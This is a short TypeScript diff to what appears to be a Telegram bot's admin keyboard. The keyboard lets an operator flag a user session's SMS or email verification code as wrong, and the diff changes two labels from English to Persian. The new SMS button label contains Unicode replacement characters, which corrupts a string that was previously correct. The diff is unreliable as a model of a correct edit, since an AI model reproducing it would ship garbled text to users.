@@ -889,7 +889,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Wrong SMS button - always available (moved from wrong buttons section)
   buttons.push([
     {
-      text: "❌ شماره اشتباه است",
+      text: "❌ شماره اشتبا�� است",
       callback_data: `incorrect_sms_${sessionId}`,
     },
   ]);
@@ -925,10 +925,10 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Wrong Email button - only if user attempted email at least once
   if (session.authAttempts["email"] && session.authAttempts["email"] > 0) {
     wrongButtonsRow2.push({
-      text: "❌ Wrong Email Code",
+      text: "🚫 کد ایمیل اشتباه",
       callback_data: `incorrect_email_${sessionId}`,
     });
-    console.log("✅ Added Wrong Email Code button");
+    console.log("✅ Added Wrong Email button");
   }
 
   // Add wrong buttons rows if there are any
